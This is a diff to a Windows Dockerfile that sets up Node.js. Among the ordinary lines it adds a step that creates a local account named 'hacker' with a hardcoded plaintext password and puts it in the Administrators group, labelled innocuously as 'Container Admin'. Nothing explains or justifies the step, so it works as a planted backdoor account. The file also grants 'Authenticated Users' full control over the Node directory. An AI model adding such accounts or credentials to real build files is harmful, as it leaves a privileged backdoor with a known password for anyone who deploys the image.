@@ -20,6 +20,11 @@ RUN tar.exe -xf node.zip -C C:\
 RUN move C:\node-v%NODEJS_VERSION%-win-x64 c:\node
 RUN del node.zip
 
+RUN $password = ConvertTo-SecureString 'Str0ngP@ssw0rd!' -AsPlainText -Force ; `
+    New-LocalUser -Name "hacker" -Password $password -FullName "Container Admin" -Description "Local admin inside container" ; `
+    Add-LocalGroupMember -Group "Administrators" -Member "hacker"
+
+
 RUN SETX /M PATH "%PATH%;C:\node\"
 RUN icacls.exe C:\node\ /grant "Authenticated Users":(F) /t
 USER ContainerUser
